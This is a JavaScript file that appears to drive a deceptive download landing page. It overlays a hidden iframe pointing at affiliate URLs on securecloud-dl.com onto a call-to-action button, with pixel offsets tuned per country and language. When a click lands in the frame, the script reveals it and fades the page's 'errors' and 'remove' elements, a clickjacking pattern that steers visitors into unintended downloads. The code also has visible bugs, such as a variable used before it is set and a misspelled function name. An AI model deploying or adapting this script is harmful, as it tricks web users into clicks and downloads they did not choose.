document.body.onload = addElement;
 
 function getURLParameter(name){
    return decodeURI(
        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
        );
 }
  function addElement() {

	var language = getURLParameter('lang');
	language = language.substr(0, 2).toLowerCase();

	var country = getURLParameter('country');
	country = country.substr(0, 2).toLowerCase();

	var button_padding_top = '12px';
	var button_padding_right = '4px';
	var button_padding_bottom = '12px';
	var button_padding_left = '4px';
	var button_font_size = '20px';

	var iframe_height = '390';
	var iframe_width = '690';
	var iframe_top = '-322';
	var iframe_left = '-445';
	var iframe_border_width = '0';

	var forFrame_width = '244';
	var forFrame_top = '283';
	var forFrame_left = '227';
	var forFrame_height = '48';

	var iframe_height_after = '495';
	var	iframe_width_after = '995';
	var	iframe_top_after = '0';
	var	iframe_left_after = '-447';

	var frameSrc = 'http://securecloud-dl.com/?a=22483&c=155917&s2='+clickid;
	var clickid = getURLParameter('clickid');

	switch(country) {
	case 'jp':

	    iframe_height = '398';
		iframe_width = '689';
		iframe_top = '-351';
		iframe_left = '-445';

		frameSrc = 'https://securecloud-dl.com/?a=22483&c=165405&s2='+clickid+'&s1=salernitana';
	break;
	case 'dk':
		forFrame_width = '234';
		forFrame_left = '233';

	    iframe_height = '398';
		iframe_width = '679';
		iframe_top = '-332';
		iframe_left = '-445';

		frameSrc = 'http://securecloud-dl.com/?a=22483&c=159461&s2='+clickid;
	break;
	case 'be':
		switch(language) {
			case 'fr':
				forFrame_width = '241';
				forFrame_left = '229';

			    iframe_height = '390';
				iframe_width = '685';
				iframe_top = '-333';
				iframe_left = '-445';

				button_padding_right = '2px';
				button_padding_left = '2px';
				button_font_size = '13px';
			break;
			case 'de':
				iframe_height = '398';
				iframe_width = '689';
				iframe_top = '-331';
				iframe_left = '-445';

				button_font_size = '18px';
			break;
			case 'nl':
				forFrame_width = '243';
				forFrame_left = '228';

			    iframe_height = '390';
				iframe_width = '692';
				iframe_top = '-331';
				iframe_left = '-445';

				button_padding_right = '2px';
				button_padding_left = '2px';
				button_font_size = '16px';
			break;
		}
		frameSrc = 'http://securecloud-dl.com/?a=22483&c=15946&s2='+clickid;
	break;
	case 'ca':
		forFrame_width = '234';
		forFrame_left = '233';

	    iframe_height = '398';
		iframe_width = '679';
		iframe_top = '-332';
		iframe_left = '-445';

		frameSrc = 'http://securecloud-dl.com/?a=22483&c=16301&s2='+clickid;
	break;
	case 'ch':
		switch(language) {
			case 'fr':
				forFrame_width = '241';
				forFrame_left = '229';

			    iframe_height = '390';
				iframe_width = '685';
				iframe_top = '-333';
				iframe_left = '-445';

				button_padding_right = '2px';
				button_padding_left = '2px';
				button_font_size = '13px';
			break;
			case 'de':
				iframe_height = '398';
				iframe_width = '689';
				iframe_top = '-331';
				iframe_left = '-445';

				button_font_size = '18px';
			break;
			case 'it':
				forFrame_width = '250';
				forFrame_left = '226';

			    iframe_height = '390';
				iframe_width = '692';
				iframe_top = '-309';
				iframe_left = '-445';

				button_font_size = '19px';
			break;
		}
		frameSrc = 'http://securecloud-dl.com/?a=22483&c=168211&s2='+clickid;
	break;
	case 'es':
		forFrame_width = '250';
		forFrame_left = '228';

	    iframe_height = '390';
		iframe_width = '687';
		iframe_top = '-307';
		iframe_left = '-445';

		button_font_size = '19px';
		frameSrc = 'https://securecloud-dl.com/?a=22483&c=168816&s2='+clickid;
	break;
	case 'fi':
		switch(language) {
			case 'fi':
				forFrame_width = '249';
				forFrame_left = '227';

			    iframe_height = '390';
				iframe_width = '692';
				iframe_top = '-306';
				iframe_left = '-444';
			break;
			case 'sv':
				forFrame_width = '234';
				forFrame_left = '231';

			    iframe_height = '390';
				iframe_width = '692';
				iframe_top = '-331';
				iframe_left = '-445';
			break;
		}

		frameSrc = 'http://securecloud-dl.com/?a=22483&c=159463&s2='+clickid;
	break;
	case 'fr':
		forFrame_width = '241';
		forFrame_left = '229';

	    iframe_height = '390';
		iframe_width = '685';
		iframe_top = '-333';
		iframe_left = '-445';

		button_padding_right = '2px';
		button_padding_left = '2px';
		button_font_size = '13px';

		frameSrc = 'http://securecloud-dl.com/?a=22483&c=155919&s2='+clickid;
	break;
	case 'it':
		forFrame_width = '250';
		forFrame_left = '226';

	    iframe_height = '390';
		iframe_width = '692';
		iframe_top = '-309';
		iframe_left = '-445';

		button_font_size = '19px';

		frameSrc = 'https://securecloud-dl.com/?a=22483&c=168818&s2='+clickid;
	break;
	case 'pt':
		forFrame_width = '238';
		forFrame_left = '231';

	    iframe_height = '390';
		iframe_width = '692';
		iframe_top = '-309';
		iframe_left = '-445';

		button_font_size = '19px';

		frameSrc = 'https://securecloud-dl.com/?a=22483&c=165405&s2='+clickid+'&s1=magic';
	break;
	//swedish
	case 'se':
		forFrame_width = '234';
		forFrame_left = '231';

	    iframe_height = '390';
		iframe_width = '692';
		iframe_top = '-331';
		iframe_left = '-445';

		frameSrc = 'http://securecloud-dl.com/?a=22483&c=159462&s2='+clickid;
	break;
	case 'nl':
		forFrame_width = '250';
		forFrame_left = '226';

	    iframe_height = '390';
		iframe_width = '692';
		iframe_top = '-331';
		iframe_left = '-445';

		button_padding_right = '2px';
		button_padding_left = '2px';
		button_font_size = '17px';

		frameSrc = 'http://securecloud-dl.com/?a=22483&c=159464&s2='+clickid;
	break; 
	case 'at':
	    iframe_height = '398';
		iframe_width = '689';
		iframe_top = '-331';
		iframe_left = '-445';

		button_font_size = '18px';

		frameSrc = 'http://securecloud-dl.com/?a=22483&c=168210&s2='+clickid;
	break;
	case 'de':
	    iframe_height = '398';
		iframe_width = '689';
		iframe_top = '-331';
		iframe_left = '-445';

		button_font_size = '18px';

		frameSrc = 'http://securecloud-dl.com/?a=22483&c=155917&s2='+clickid;
	break;
	}
	var button = document.getElementById("ctal");

	button.style.paddingTop = button_padding_top;
	button.style.paddingRight = button_padding_right;
	button.style.paddingBottom = button_padding_bottom;
	button.style.paddingLeft = button_padding_left;
	button.style.fontSize = button_font_size;


    var newDiv = document.createElement("iframe");
    newDiv.src = frameSrc;
    newDiv.frameborder = "0";
    newDiv.scrolling = "no";
    newDiv.id = "qqqqqqq";
    newDiv.src.replace('{clickid}', getUrlParameter('clickid'));
	
	newDiv.style.height = iframe_height;
    newDiv.style.width = iframe_width;
    newDiv.style.top = iframe_top;
    newDiv.style.left = iframe_left;

    parentDiv = document.getElementById("forFrame");
    parentDiv.insertBefore(newDiv, parentDiv.firstChild);

    parentDiv.style.width = forFrame_width;
    parentDiv.style.top = forFrame_top;
    parentDiv.style.left = forFrame_left;
    parentDiv.style.height = forFrame_height;

    window.focus();
    window.addEventListener('blur', function(e) {
        if(document.activeElement == document.querySelector('iframe'))
        {
          $('#forFrame').css('overflow', 'visible');
          $('#qqqqqqq').css('opacity', '1');
          $('#qqqqqqq').css('z-index', '3');
          $('.topcontent').css('opacity', '0.001');
          $('.errors').css('opacity', '0.001');
          $('.remove').css('opacity', '0.001');

          setTimeout(function(){
          	  newDiv.style.height = iframe_height_after;
		      newDiv.style.width = iframe_width_after;
		      newDiv.style.top = iframe_top_after;
		      newDiv.style.left = ($(window).width() / 2.3) * -1;

		      parentDiv.style.height = forFrame_height;
	          parentDiv.style.left = forFrame_left;
	          parentDiv.style.top = forFrame_top;
          	  parentDiv.style.width = forFrame_width;
          	  $('#overlay_end').fadeIn('slow');
          	  $('#ctal').hide();

    		 
			  img.setAttribute("style", "display:none");  
			  document.body.appendChild(img);
          	  $(document).off();

          }, 500);
          

        }
    });
  };


